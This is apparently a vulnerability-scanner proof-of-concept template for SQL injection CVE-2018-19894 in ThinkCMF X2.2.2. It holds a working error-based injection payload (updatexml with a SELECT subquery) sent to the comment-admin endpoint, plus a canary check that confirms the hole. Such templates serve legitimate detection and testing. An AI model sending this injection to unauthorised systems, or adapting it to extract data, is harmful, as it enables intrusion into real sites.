name: poc-yaml-thinkcmf-cve-2018-19894-sqli
rules:
  - method: POST
    path: /index.php?g=Comment&m=commentadmin&a=check&check=1
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: >-
      ids%5B%5D=1&ids%5B%5D=2+and+updatexml%281%2Cconcat%280x7e%2C%28SELECT+md5%282000000005%29%29%2C0x7e%29%2C1%29
    expression: |
      response.status == 404 && response.body.bcontains(b"fc9bdfb86bae5c322bae5acd7876093")

detail:
  author: jweny
  ThinkCMF: x2.2.2
  links:
    - https://github.com/thinkcmf/cmfx/issues/26